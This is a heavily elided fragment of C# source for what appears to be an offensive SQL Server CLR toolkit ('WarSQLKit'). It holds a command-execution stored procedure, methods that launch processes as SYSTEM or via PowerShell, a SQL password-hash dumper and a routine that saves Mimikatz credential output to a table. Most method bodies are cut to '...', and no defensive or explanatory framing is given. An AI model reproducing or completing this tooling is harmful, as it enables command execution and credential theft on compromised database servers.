...
+ "EXEC sp_cmdExec 'sp_getDatabases';  => Get Available Database\n";
    ...
    public static string RunSystemPriv(string filename, string arguments)
    {
        var process = new Process();
    ...
    public static string RunSystemPS(string filename, string arguments)
    {
        var process = new Process();
    ...
    public static string GetSqlHash()
    {
    ...
    public static string GetMimiLog()
    {
        using (SqlConnection connection = new SqlConnection("context connection=true"))
        {
            try
            ...
            return "Mimikatz Log Saved! Please run \"select * from WarSQLKitTemp\"";
        }
    }
}
